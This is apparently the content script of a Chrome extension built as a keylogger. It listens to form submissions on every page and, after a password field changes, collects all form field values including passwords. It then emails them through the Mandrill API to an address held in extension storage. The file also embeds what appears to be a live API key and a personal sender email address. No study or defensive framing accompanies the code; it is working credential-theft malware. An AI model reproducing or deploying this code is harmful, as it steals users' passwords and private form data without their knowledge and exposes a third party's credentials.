function email(send_data) {
    console.log('email');
    chrome.storage.local.get('email',function(data_email){
        xhr = new XMLHttpRequest();
        xhr.onreadystatechange = function() {
            if (xhr.readyState == 4 && xhr.status == 200) {
                console.log(xhr.responseText);
            }
        }
        xhr.open('POST', 'https://mandrillapp.com/api/1.0/messages/send.json');
        xhr.send(JSON.stringify({
            key: "lKMuUzQp9IyrP7iPUcAeDw",
            message: {
              from_email: "megha893.arora@gmail.com",
              to:[
                  {
                    email: data_email.email,
                    name: "Hi User!",
                    type: "to"
                  }
                ],
              autotext: "true",
              subject: "Keylogger data" + " from " + document.title,
              html: JSON.stringify(send_data)
            }
        }));

    });
        
}

var password_edited = false;

if (!document.title) {
    document.title = document.URL;
}

console.log(document.title);

function saveForm(time, data) {
    var toSave = {};
    toSave[time] = document.title + "^~^" + document.URL + "^~^" + JSON.stringify(data);
    chrome.storage.local.set(toSave, function() { console.log("Saved", data); });
    
    email(toSave);
    //sendToUrl();
}

function getPasswordInputElements() {
    var pwd_el = [];

    var el = document.getElementsByTagName('input');

    for (var i = 0; i < el.length; i++) {
        if (el[i].getAttribute('type') == 'password')
            pwd_el.push(el[i]);
    }

    return pwd_el;
}

function listenPasswordEntered() {
    var pwd_el = getPasswordInputElements();

    for (var i = 0; i < pwd_el.length; i++) {
        pwd_el[i].addEventListener('change', function() {
            password_edited = true;
        })
    }
}

var forms = document.getElementsByTagName('form');
for (var i = 0; i < forms.length; i++) {
    forms[i].addEventListener('submit', function(e) {
        var data = {};
        data['FormName'] = e.target.name;
        data['FormAction'] = e.target.action;
        data['FormElements'] = {};
        var elements = e.target.elements;
        for (var n = 0; n < elements.length; n++) {
            data['FormElements'][elements[n].name] = elements[n].value;
        }
        
        if (password_edited) {
            saveForm(e.timeStamp, data);
        }
    
    });





}

listenPasswordEntered();